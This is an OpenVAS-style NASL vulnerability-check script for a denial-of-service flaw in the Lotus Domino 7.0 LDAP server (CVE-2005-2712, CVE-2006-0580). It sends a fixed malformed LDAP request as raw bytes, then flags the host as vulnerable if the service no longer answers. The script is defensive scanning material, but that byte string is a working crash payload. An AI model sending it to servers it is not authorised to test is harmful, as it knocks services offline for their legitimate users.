# SPDX-FileCopyrightText: 2005 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.20890");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_cve_id("CVE-2005-2712", "CVE-2006-0580");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_name("Lotus Domino LDAP Server Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2005 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("ldap_detect.nasl");
  script_require_ports("Services/ldap", 389, 636);
  script_mandatory_keys("ldap/detected");

  script_xref(name:"URL", value:"http://lists.immunitysec.com/pipermail/dailydave/2006-February/002896.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/16523");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"The remote LDAP server is affected by a denial of service
  vulnerability.");

  script_tag(name:"insight", value:"The LDAP server on the remote host appears to have crashed
  after being sent a malformed request. The specific request used is known to crash
  the LDAP server in Lotus Domino 7.0.");

  script_tag(name:"impact", value:"By leveraging this flaw, an attacker may be able to deny
  service to legitimate users.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

# Note: this script was *not* tested against a vulnerable server!

include("ldap.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = ldap_get_port(default:389);

if(!ldap_alive(port:port))
  exit(0);

s = open_sock_tcp(port);
if(!s)
  exit(0);

send(socket:s, data:'\x30\x0c\x02\x01\x01\x60\x07\x02\x00\x03\x04\x00\x80\x00');
res = recv(socket:s, length:1024);
close(s);

if(isnull(res)) {
  sleep(1);
  s = open_sock_tcp(port);
  if(s)
    close(s);
  else
    security_message(port:port);
}
